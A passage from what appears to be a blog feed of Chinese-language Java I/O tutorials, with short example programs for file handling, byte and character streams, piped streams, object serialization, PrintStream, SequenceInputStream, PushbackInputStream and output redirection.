        Field[] fs = c.getDeclaredFields();
        Bean b = null;
        try &#123;
            b = c.newInstance();
        &#125; catch (InstantiationException e) &#123;
            // TODO Auto-generated catch block
            e.printStackTrace();
        &#125; catch (IllegalAccessException e) &#123;
            // TODO Auto-generated catch block
            e.printStackTrace();
        &#125;
        Field f = fs[0];// 由于只有一个属性所以这样测试
        System.out.println(f.getName() + &quot;=&quot; + b.getField());
        String fn = f.getName();
        //用属性名合成set方法名
        fn = fn.replaceFirst(fn.substring(0, 1), fn.substring(0, 1)
                .toUpperCase());
        System.out.println(fn);
        Method m = null;

        Class[] partypes = new Class[]&#123;String.class&#125;;
        
        try &#123;
            m = c.getMethod(&quot;set&quot; + fn, partypes);
        &#125; catch (SecurityException e) &#123;
            // TODO Auto-generated catch block
            e.printStackTrace();
        &#125; catch (NoSuchMethodException e) &#123;
            // TODO Auto-generated catch block
            e.printStackTrace();
        &#125;
        System.out.println(m.getName());
        Object arglist[] = new Object[]&#123;&quot;iteedu&quot;&#125;;

        try &#123;
            m.invoke(b, arglist);
        &#125; catch (IllegalArgumentException e) &#123;
            // TODO Auto-generated catch block
            e.printStackTrace();
        &#125; catch (IllegalAccessException e) &#123;
            // TODO Auto-generated catch block
            e.printStackTrace();
        &#125; catch (InvocationTargetException e) &#123;
            // TODO Auto-generated catch block
            e.printStackTrace();
        &#125;
        System.out.println(f.getName() + &quot;=&quot; + b.getField());

    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA IO之字节流转化为字符流</title>
    <url>/blog/plang/java/io/bytetochar/</url>
    <content><![CDATA[<p>将字节输出流转化为字符输出流</p>
<pre><code>/**
 * 将字节输出流转化为字符输出流
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) throws IOException &#123;
        String fileName= &quot;d:&quot;+File.separator+&quot;hello.txt&quot;;
        File file=new File(fileName);
        Writer out=new OutputStreamWriter(new FileOutputStream(file));
        out.write(&quot;hello&quot;);
        out.close();
    &#125;
&#125;
</code></pre>
<p>将字节输入流变为字符输入流</p>
<pre><code>/**
 * 将字节输入流变为字符输入流
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) throws IOException &#123;
        String fileName= &quot;d:&quot;+File.separator+&quot;hello.txt&quot;;
        File file=new File(fileName);
        Reader read=new InputStreamReader(new FileInputStream(file));
        char[] b=new char[100];
        int len=read.read(b);
        System.out.println(new String(b,0,len));
        read.close();
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>JAVA IO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA IO之DataOutputStream&amp;DataInputStream</title>
    <url>/blog/plang/java/io/dataio/</url>
    <content><![CDATA[<p>有时没有必要存储整个对象的信息，而只是要存储一个对象的成员数据，成员数据的类型假设都是Java的基本数据类型，这样的需求不必使用到与Object输入、输出相关的流对象，可以使用DataInputStream、DataOutputStream来写入或读出数据。</p>
<p>DataOutputStream:</p>
<pre><code>import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
 
public class DataOutputStreamDemo&#123;
    public static void main(String[] args) throws IOException&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        char[] ch = &#123; &#39;A&#39;, &#39;B&#39;, &#39;C&#39; &#125;;
        DataOutputStream out = null;
        out = new DataOutputStream(new FileOutputStream(file));
        for(char temp : ch)&#123;
            out.writeChar(temp);
        &#125;
        out.close();
    &#125;
&#125;
</code></pre>
<p>现在我们在上面例子的基础上，使用DataInputStream读出内容</p>
<pre><code>import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
 
public class DataOutputStreamDemo&#123;
    public static void main(String[] args) throws IOException&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        DataInputStream input = new DataInputStream(new FileInputStream(file));
        char[] ch = new char[10];
        int count = 0;
        char temp;
        while((temp = input.readChar()) != &#39;C&#39;)&#123;
            ch[count++] = temp;
        &#125;
        System.out.println(ch);
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>JAVA IO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA IO之File类的使用</title>
    <url>/blog/plang/java/io/file/</url>
    <content><![CDATA[<h2 id="创建一个新文件"><a href="#创建一个新文件" class="headerlink" title="创建一个新文件"></a>创建一个新文件</h2><pre><code>import java.io.*;
class hello&#123;
    public static void main(String[] args) &#123;
        File f=new File(&quot;D:\\hello.txt&quot;);
        try&#123;
            f.createNewFile();
        &#125;catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
</code></pre>
<h2 id="File类的两个常量"><a href="#File类的两个常量" class="headerlink" title="File类的两个常量"></a>File类的两个常量</h2><pre><code>import java.io.*;
class hello&#123;
    public static void main(String[] args) &#123;
        System.out.println(File.separator);
        System.out.println(File.pathSeparator);
    &#125;
&#125;
</code></pre>
<h2 id="删除一个文件"><a href="#删除一个文件" class="headerlink" title="删除一个文件"></a>删除一个文件</h2><pre><code>/**
 * 删除一个文件
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) &#123;
        String fileName=&quot;D:&quot;+File.separator+&quot;hello.txt&quot;;
        File f=new File(fileName);
        if(f.exists())&#123;
            f.delete();
        &#125;else&#123;
            System.out.println(&quot;文件不存在&quot;);
        &#125;
         
    &#125;
&#125;
</code></pre>
<h2 id="创建一个文件夹"><a href="#创建一个文件夹" class="headerlink" title="创建一个文件夹"></a>创建一个文件夹</h2><pre><code>/**
 * 创建一个文件夹
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) &#123;
        String fileName=&quot;D:&quot;+File.separator+&quot;hello&quot;;
        File f=new File(fileName);
        f.mkdir();
    &#125;
&#125;
</code></pre>
<h2 id="列出指定目录的全部文件（包括隐藏文件）："><a href="#列出指定目录的全部文件（包括隐藏文件）：" class="headerlink" title="列出指定目录的全部文件（包括隐藏文件）："></a>列出指定目录的全部文件（包括隐藏文件）：</h2><pre><code>/**
 * 使用list列出指定目录的全部文件
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) &#123;
        String fileName=&quot;D:&quot;+File.separator;
        File f=new File(fileName);
        String[] str=f.list();
        for (int i = 0; i &lt; str.length; i++) &#123;
            System.out.println(str[i]);
        &#125;
    &#125;
&#125;
</code></pre>
<h2 id="列出指定目录的全部文件（包括隐藏文件）：-1"><a href="#列出指定目录的全部文件（包括隐藏文件）：-1" class="headerlink" title="列出指定目录的全部文件（包括隐藏文件）："></a>列出指定目录的全部文件（包括隐藏文件）：</h2><pre><code>/**
 * 使用listFiles列出指定目录的全部文件
 * listFiles输出的是完整路径
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) &#123;
        String fileName=&quot;D:&quot;+File.separator;
        File f=new File(fileName);
        File[] str=f.listFiles();
        for (int i = 0; i &lt; str.length; i++) &#123;
            System.out.println(str[i]);
        &#125;
    &#125;
&#125;
</code></pre>
<h2 id="判断一个指定的路径是否为目录"><a href="#判断一个指定的路径是否为目录" class="headerlink" title="判断一个指定的路径是否为目录"></a>判断一个指定的路径是否为目录</h2><pre><code>/**
 * 使用isDirectory判断一个指定的路径是否为目录
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) &#123;
        String fileName=&quot;D:&quot;+File.separator;
        File f=new File(fileName);
        if(f.isDirectory())&#123;
            System.out.println(&quot;YES&quot;);
        &#125;else&#123;
            System.out.println(&quot;NO&quot;);
        &#125;
    &#125;
&#125;
</code></pre>
<h2 id="搜索指定目录的全部内容"><a href="#搜索指定目录的全部内容" class="headerlink" title="搜索指定目录的全部内容"></a>搜索指定目录的全部内容</h2><pre><code>/**
 * 列出指定目录的全部内容
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) &#123;
        String fileName=&quot;D:&quot;+File.separator;
        File f=new File(fileName);
        print(f);
    &#125;
    public static void print(File f)&#123;
        if(f!=null)&#123;
            if(f.isDirectory())&#123;
                File[] fileArray=f.listFiles();
                if(fileArray!=null)&#123;
                    for (int i = 0; i &lt; fileArray.length; i++) &#123;
                        //递归调用
                        print(fileArray[i]);
                    &#125;
                &#125;
            &#125;
            else&#123;
                System.out.println(f);
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>JAVA IO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA IO之FileInputStream&amp;FileOutputStream</title>
    <url>/blog/plang/java/io/fosfis/</url>
    <content><![CDATA[<h2 id="向文件中写入字符串"><a href="#向文件中写入字符串" class="headerlink" title="向文件中写入字符串"></a>向文件中写入字符串</h2><pre><code>/**
 * 字节流
 * 向文件中写入字符串
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) throws IOException &#123;
        String fileName=&quot;D:&quot;+File.separator+&quot;hello.txt&quot;;
        File f=new File(fileName);
        OutputStream out =new FileOutputStream(f);
        String str=&quot;你好&quot;;
        byte[] b=str.getBytes();
        out.write(b);
        out.close();
    &#125;
&#125;
</code></pre>
<p>当然也可以一个字节一个字节的写。</p>
<pre><code>/**
 * 字节流
 * 向文件中一个字节一个字节的写入字符串
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) throws IOException &#123;
        String fileName=&quot;D:&quot;+File.separator+&quot;hello.txt&quot;;
        File f=new File(fileName);
        OutputStream out =new FileOutputStream(f);
        String str=&quot;你好&quot;;
        byte[] b=str.getBytes();
        for (int i = 0; i &lt; b.length; i++) &#123;
            out.write(b[i]);
        &#125;
        out.close();
    &#125;
&#125;
</code></pre>
<p>向文件中追加新内容：</p>
<pre><code>/**
 * 字节流
 * 向文件中追加新内容：
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) throws IOException &#123;
        String fileName=&quot;D:&quot;+File.separator+&quot;hello.txt&quot;;
        File f=new File(fileName);
        OutputStream out =new FileOutputStream(f,true);
        String str=&quot;Rollen&quot;;
        //String str=&quot;\r\nRollen&quot;;  可以换行
        byte[] b=str.getBytes();
        for (int i = 0; i &lt; b.length; i++) &#123;
            out.write(b[i]);
        &#125;
        out.close();
    &#125;
&#125;
</code></pre>
<h2 id="读取文件内容"><a href="#读取文件内容" class="headerlink" title="读取文件内容"></a>读取文件内容</h2><pre><code>/**
 * 字节流
 * 读文件内容
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) throws IOException &#123;
        String fileName=&quot;D:&quot;+File.separator+&quot;hello.txt&quot;;
        File f=new File(fileName);
        InputStream in=new FileInputStream(f);
        byte[] b=new byte[1024];
        in.read(b);
        in.close();
        System.out.println(new String(b));
    &#125;
&#125;
</code></pre>
<p>这个例子读取出来会有大量的空格，我们可以利用in.read(b);的返回值来设计程序。如下：</p>
<pre><code>/**
 * 字节流
 * 读文件内容
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) throws IOException &#123;
        String fileName=&quot;D:&quot;+File.separator+&quot;hello.txt&quot;;
        File f=new File(fileName);
        InputStream in=new FileInputStream(f);
        byte[] b=new byte[1024];
        int len=in.read(b);
        in.close();
        System.out.println(&quot;读入长度为：&quot;+len);
        System.out.println(new String(b,0,len));
    &#125;
&#125;
</code></pre>
<p>我们预先申请了一个指定大小的空间，但是有时候这个空间可能太小，有时候可能太大，我们需要准确的大小，这样节省空间，那么我们可以这样干：</p>
<pre><code>/**
 * 字节流
 * 读文件内容,节省空间
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) throws IOException &#123;
        String fileName=&quot;D:&quot;+File.separator+&quot;hello.txt&quot;;
        File f=new File(fileName);
        InputStream in=new FileInputStream(f);
        byte[] b=new byte[(int)f.length()];
        in.read(b);
        System.out.println(&quot;文件长度为：&quot;+f.length());
        in.close();
        System.out.println(new String(b));
    &#125;
&#125;
</code></pre>
<p>将上面的例子改为一个一个读：</p>
<pre><code>/**
 * 字节流
 * 读文件内容,节省空间
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) throws IOException &#123;
        String fileName=&quot;D:&quot;+File.separator+&quot;hello.txt&quot;;
        File f=new File(fileName);
        InputStream in=new FileInputStream(f);
        byte[] b=new byte[(int)f.length()];
        for (int i = 0; i &lt; b.length; i++) &#123;
            b[i]=(byte)in.read();
        &#125;
        in.close();
        System.out.println(new String(b));
    &#125;
&#125;
</code></pre>
<p>上面的几个例子都是在知道文件的内容多大，然后才展开的，有时候我们不知道文件有多大，这种情况下，我们需要判断是否独到文件的末尾。</p>
<pre><code>/**
 * 字节流
 * 读文件
 * */
import java.io.*;
class hello&#123;
    public static void main(String[] args) throws IOException &#123;
        String fileName=&quot;D:&quot;+File.separator+&quot;hello.txt&quot;;
        File f=new File(fileName);
        InputStream in=new FileInputStream(f);
        byte[] b=new byte[1024];
        int count =0;
        int temp=0;
        while((temp=in.read())!=(-1))&#123;
            b[count++]=(byte)temp;
        &#125;
        in.close();
        System.out.println(new String(b));
    &#125;
&#125;
</code></pre>
<p>提醒一下，当独到文件末尾的时候会返回-1.正常情况下是不会返回-1的</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>JAVA IO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA IO之PipedOutputStream&amp;PipedInputStream</title>
    <url>/blog/plang/java/io/pipedio/</url>
    <content><![CDATA[<p>管道流主要可以进行两个线程之间的通信。</p>
<p>PipedOutputStream 管道输出流</p>
<p>PipedInputStream 管道输入流</p>
<pre><code>/**
 * 验证管道流
 * */
import java.io.*;
 
/**
 * 消息发送类
 * */
class Send implements Runnable&#123;
    private PipedOutputStream out=null;
    public Send() &#123;
        out=new PipedOutputStream();
    &#125;
    public PipedOutputStream getOut()&#123;
        return this.out;
    &#125;
    public void run()&#123;
        String message=&quot;hello , ITEEDU&quot;;
        try&#123;
            out.write(message.getBytes());
        &#125;catch (Exception e) &#123;
            e.printStackTrace();
        &#125;try&#123;
            out.close();
        &#125;catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
 
/**
 * 接受消息类
 * */
class Recive implements Runnable&#123;
    private PipedInputStream input=null;
    public Recive()&#123;
        this.input=new PipedInputStream();
    &#125;
    public PipedInputStream getInput()&#123;
        return this.input;
    &#125;
    public void run()&#123;
        byte[] b=new byte[1000];
        int len=0;
        try&#123;
            len=this.input.read(b);
        &#125;catch (Exception e) &#123;
            e.printStackTrace();
        &#125;try&#123;
            input.close();
        &#125;catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
        System.out.println(&quot;接受的内容为 &quot;+(new String(b,0,len)));
    &#125;
&#125;
/**
 * 测试类
 * */
class hello&#123;
    public static void main(String[] args) throws IOException &#123;
        Send send=new Send();
        Recive recive=new Recive();
        try&#123;
//管道连接
            send.getOut().connect(recive.getInput());
        &#125;catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
        new Thread(send).start();
        new Thread(recive).start();
    &#125;
&#125;
</code></pre>
<p>【运行结果】：</p>
<p>接受的内容为 hello , ITEEDU</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>JAVA IO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA IO之ObjectOutputStream&amp;ObjectIntputStream</title>
    <url>/blog/plang/java/io/objectio/</url>
    <content><![CDATA[<p>ObjectInputStream和ObjectOutputStream用于对象序列化操作。</p>
<p>对象序列化就是把一个对象变为二进制数据流的一种方法。一个类要想被序列化，就行必须实现java.io.Serializable接口。虽然这个接口中没有任何方法，就如同之前的cloneable接口一样。实现了这个接口之后，就表示这个类具有被序列化的能力。</p>
<h2 id="ObjectOutputStream"><a href="#ObjectOutputStream" class="headerlink" title="ObjectOutputStream"></a>ObjectOutputStream</h2><pre><code>import java.io.Serializable;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
 
/**
 * 实现具有序列化能力的类
 * */
public class Person implements Serializable&#123;
    public Person()&#123;
 
    &#125;
 
    public Person(String name, int age)&#123;
        this.name = name;
        this.age = age;
    &#125;
 
    @Override
    public String toString()&#123;
        return &quot;姓名：&quot; + name + &quot;  年龄：&quot; + age;
    &#125;
 
    private String name;
    private int age;
&#125;
/**
 * 示范ObjectOutputStream
 * */
public class ObjectOutputStreamDemo&#123;
    public static void main(String[] args) throws IOException&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(
                file));
        oos.writeObject(new Person(&quot;rollen&quot;, 20));
        oos.close();
    &#125;
&#125;
</code></pre>
<h2 id="ObjectInputStream"><a href="#ObjectInputStream" class="headerlink" title="ObjectInputStream"></a>ObjectInputStream</h2><pre><code>import java.io.File;
import java.io.FileInputStream;
import java.io.ObjectInputStream;
 
/**
 * ObjectInputStream示范
 * */
public class ObjectInputStreamDemo&#123;
    public static void main(String[] args) throws Exception&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        ObjectInputStream input = new ObjectInputStream(new FileInputStream(
                file));
        Object obj = input.readObject();
        input.close();
        System.out.println(obj);
    &#125;
&#125;
</code></pre>
<h2 id="Externalizable接口"><a href="#Externalizable接口" class="headerlink" title="Externalizable接口"></a>Externalizable接口</h2><p>被Serializable接口声明的类的对象的属性都将被序列化，但是如果想自定义序列化的内容的时候，就需要实现Externalizable接口。</p>
<p>当一个类要使用Externalizable这个接口的时候，这个类中必须要有一个无参的构造函数，如果没有的话，在构造的时候会产生异常，这是因为在反序列话的时候会默认调用无参的构造函数。</p>
<pre><code>package IO;
 
import java.io.Externalizable;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInput;
import java.io.ObjectInputStream;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
 
/**
 * 序列化和反序列化的操作
 * */
public class ExternalizableDemo&#123;
    public static void main(String[] args) throws Exception&#123;
        ser(); // 序列化
        dser(); // 反序列话
    &#125;
 
    public static void ser() throws Exception&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(
                file));
        out.writeObject(new Person(&quot;rollen&quot;, 20));
        out.close();
    &#125;
 
    public static void dser() throws Exception&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        ObjectInputStream input = new ObjectInputStream(new FileInputStream(
                file));
        Object obj = input.readObject();
        input.close();
        System.out.println(obj);
    &#125;
&#125;
 
class Person implements Externalizable&#123;
    public Person()&#123;
 
    &#125;
 
    public Person(String name, int age)&#123;
        this.name = name;
        this.age = age;
    &#125;
 
    @Override
    public String toString()&#123;
        return &quot;姓名：&quot; + name + &quot;  年龄：&quot; + age;
    &#125;
 
    // 复写这个方法，根据需要可以保存的属性或者具体内容，在序列化的时候使用
    @Override
    public void writeExternal(ObjectOutput out) throws IOException&#123;
        out.writeObject(this.name);
        out.writeInt(age);
    &#125;
 
    // 复写这个方法，根据需要读取内容 反序列话的时候需要
    @Override
    public void readExternal(ObjectInput in) throws IOException,
            ClassNotFoundException&#123;
        this.name = (String) in.readObject();
        this.age = in.readInt();
    &#125;
 
    private String name;
    private int age;
&#125;
</code></pre>
<h2 id="transient关键字"><a href="#transient关键字" class="headerlink" title="transient关键字"></a>transient关键字</h2><p>当我们使用Serializable接口实现序列化操作的时候，如果一个对象的某一个属性不想被序列化保存下来，那么我们可以使用transient关键字进行说明</p>
<p>Serializable接口实现的操作其实是吧一个对象中的全部属性进行序列化，当然也可以使用我们上使用是Externalizable接口以实现部分属性的序列化，但是这样的操作比较麻烦</p>
<pre><code>package IO;
 
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
 
/**
 * 序列化和反序列化的操作
 * */
public class serDemo&#123;
    public static void main(String[] args) throws Exception&#123;
        ser(); // 序列化
        dser(); // 反序列话
    &#125;
 
    public static void ser() throws Exception&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(
                file));
        out.writeObject(new Person1(&quot;rollen&quot;, 20));
        out.close();
    &#125;
 
    public static void dser() throws Exception&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        ObjectInputStream input = new ObjectInputStream(new FileInputStream(
                file));
        Object obj = input.readObject();
        input.close();
        System.out.println(obj);
    &#125;
&#125;
 
class Person1 implements Serializable&#123;
    public Person1()&#123;
 
    &#125;
 
    public Person1(String name, int age)&#123;
        this.name = name;
        this.age = age;
    &#125;
 
    @Override
    public String toString()&#123;
        return &quot;姓名：&quot; + name + &quot;  年龄：&quot; + age;
    &#125;
 
    // 注意这里
    private transient String name;
    private int age;
&#125;
</code></pre>
<h2 id="序列化一组对象的例子"><a href="#序列化一组对象的例子" class="headerlink" title="序列化一组对象的例子"></a>序列化一组对象的例子</h2><pre><code>import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
 
/**
 * 序列化一组对象
 * */
public class SerDemo1&#123;
    public static void main(String[] args) throws Exception&#123;
        Student[] stu = &#123; new Student(&quot;hello&quot;, 20), new Student(&quot;world&quot;, 30),
                new Student(&quot;rollen&quot;, 40) &#125;;
        ser(stu);
        Object[] obj = dser();
        for(int i = 0; i &lt; obj.length; ++i)&#123;
            Student s = (Student) obj[i];
            System.out.println(s);
        &#125;
    &#125;
 
    // 序列化
    public static void ser(Object[] obj) throws Exception&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(
                file));
        out.writeObject(obj);
        out.close();
    &#125;
 
    // 反序列化
    public static Object[] dser() throws Exception&#123;
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        ObjectInputStream input = new ObjectInputStream(new FileInputStream(
                file));
        Object[] obj = (Object[]) input.readObject();
        input.close();
        return obj;
    &#125;
&#125;
 
class Student implements Serializable&#123;
    public Student()&#123;
 
    &#125;
 
    public Student(String name, int age)&#123;
        this.name = name;
        this.age = age;
    &#125;
 
    @Override
    public String toString()&#123;
        return &quot;姓名：  &quot; + name + &quot;  年龄：&quot; + age;
    &#125;
 
    private String name;
    private int age;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>JAVA IO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA IO之PrintStream的使用</title>
    <url>/blog/plang/java/io/prints/</url>
    <content><![CDATA[<h2 id="打印流"><a href="#打印流" class="headerlink" title="打印流"></a>打印流</h2><pre><code>/**
 * 使用PrintStream进行输出
 * */
import java.io.*;
 
class hello &#123;
    public static void main(String[] args) throws IOException &#123;
        PrintStream print = new PrintStream(new FileOutputStream(new File(&quot;d:&quot;
                + File.separator + &quot;hello.txt&quot;)));
        print.println(true);
        print.println(&quot;ITEEDU&quot;);
        print.close();
    &#125;
&#125;
</code></pre>
<p>当然也可以格式化输出</p>
<pre><code>/**
 * 使用PrintStream进行输出
 * 并进行格式化
 * */
import java.io.*;
class hello &#123;
    public static void main(String[] args) throws IOException &#123;
        PrintStream print = new PrintStream(new FileOutputStream(new File(&quot;d:&quot;
                + File.separator + &quot;hello.txt&quot;)));
        String name=&quot;Rollen&quot;;
        int age=20;
        print.printf(&quot;姓名：%s. 年龄：%d.&quot;,name,age);
        print.close();
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>JAVA IO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA IO之SequenceInputStream</title>
    <url>/blog/plang/java/io/sequenceio/</url>
    <content><![CDATA[<p>SequenceInputStream主要用来将2个流合并在一起，比如将两个txt中的内容合并为另外一个txt。下面给出一个实例：</p>
<pre><code>import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.SequenceInputStream;
 
/**
 * 将两个文本文件合并为另外一个文本文件
 * */
public class SequenceInputStreamDemo&#123;
    public static void main(String[] args) throws IOException&#123;
        File file1 = new File(&quot;d:&quot; + File.separator + &quot;hello1.txt&quot;);
        File file2 = new File(&quot;d:&quot; + File.separator + &quot;hello2.txt&quot;);
        File file3 = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        InputStream input1 = new FileInputStream(file1);
        InputStream input2 = new FileInputStream(file2);
        OutputStream output = new FileOutputStream(file3);
        // 合并流
        SequenceInputStream sis = new SequenceInputStream(input1, input2);
        int temp = 0;
        while((temp = sis.read()) != -1)&#123;
            output.write(temp);
        &#125;
        input1.close();
        input2.close();
        output.close();
        sis.close();
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>JAVA IO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA IO之PushbackInputStream</title>
    <url>/blog/plang/java/io/pushbackio/</url>
    <content><![CDATA[<p>如果最后一个不是英文的，而是一个汉字，显示是正确的。没找到原因。</p>
<p>java.io.PushbackInputStream拥有一个PushBack缓冲区，从PushbackInputStream读出数据后，只要PushBack缓冲区没有满，就可以使用unread()将数据推回流的前端。</p>
<p>假设一个文本文件中同时存储有ASCII码范围的英文字符与BIG5范围的中文字符。想要判断那些位置是ASCII而哪些位置是BIG5中文字符，BIG5中文字符使用两个字节来表示一个中文字，而ASCII只使用一个字节来表示英文字符。</p>
<p>Big5中文为了与ASCII兼容，低字节范围内0xA4-0xF9，而高字节为0x40–0x7E以及0xA1–0xFE。存储时低字节先存，再存高字节，所以读取时只要先读到字节是在0xA4–0xF9，就表示它可能是一个中文字符的前半数据。</p>
<p>下面的范例说明PushbackInputStream的功能，一次从文件中读取两个字节，并检查两个字节合并后的整数值是否在0xA440–0xFFFF之间，这样可以简单地判断其两个字节合并后是否为BIG码。如果是BIG5码则使用这两个字节产生String实例以显示汉字字符；如果不在这个范围之内，则可能是个ASCII范围内的字符，您可以显示第一个字节的字符表示，并将第二个字节推回流，以待下一次可以重新读取。</p>
<pre><code>package ysu.hxy;

import java.io.*;

public class PushbackInputStreamDemo
&#123;
    public static void main(String[] args)
    &#123;
        try
        &#123;
            PushbackInputStream pushbackInputStream =
                new PushbackInputStream(new FileInputStream(args[0]));

            byte[] array = new byte[2];

            int tmp = 0;
            int count = 0;

            while((count = pushbackInputStream.read(array))!=-1)
            &#123;
                //两个字节转换为整数 
                tmp = (short)((array[0] &lt;&lt; 8) | (array[1] &amp; 0xff));
                tmp = tmp &amp; 0xFFFF;

                //判断是否为BIG5，如果是则显示BIG5中文字
                if(tmp &gt;= 0xA440 &amp;&amp; tmp &lt; 0xFFFF)
                &#123;
                    System.out.println(&quot;BIG5:&quot; + new String(array));
                &#125;
                else
                &#123;
                    //将第二个字节推回流
                    pushbackInputStream.unread(array,1,1);
                    //显示ASCII范围的字符
                    System.out.println(&quot;ASCII: &quot; + (char)array[0]);
                &#125;
            &#125;
            pushbackInputStream.close();
        &#125;
        catch(ArrayIndexOutOfBoundsException e)
        &#123;
            System.out.println(&quot;请指定文件名称&quot;);
        &#125;
        catch(IOException e)
        &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
</code></pre>
<p>不过这段代码好象有问题：当test.txt里面内容是：a这y是c 时，运行结果如下：</p>
<pre><code>ASCII: a
BIG5: 这
ASCII: y
BIG5: 是
ASCII: c
BIG5: 乔
</code></pre>
<p>如果最后一个不是英文的，而是一个汉字，显示是正确的。没找到原因。</p>
<p>转：<a href="http://xyiyy.iteye.com/blog/361351">http://xyiyy.iteye.com/blog/361351</a></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>JAVA IO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA IO之输入输出生定向</title>
    <url>/blog/plang/java/io/setio/</url>
    <content><![CDATA[<p>使用OutputStream向屏幕上输出内容</p>
<pre><code>/**
 * 使用OutputStream向屏幕上输出内容
 * */
import java.io.*;
class hello &#123;
    public static void main(String[] args) throws IOException &#123;
        OutputStream out=System.out;
        try&#123;
            out.write(&quot;hello&quot;.getBytes());
        &#125;catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
        try&#123;
            out.close();
        &#125;catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
</code></pre>
<h2 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h2><pre><code>import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.PrintStream;
 
/**
 * 为System.out.println()重定向输出
 * */
public class systemDemo&#123;
    public static void main(String[] args)&#123;
        // 此刻直接输出到屏幕
        System.out.println(&quot;hello&quot;);
        File file = new File(&quot;d:&quot; + File.separator + &quot;hello.txt&quot;);
        try&#123;
            System.setOut(new PrintStream(new FileOutputStream(file)));
        &#125;catch(FileNotFoundException e)&#123;
            e.printStackTrace();
        &#125;
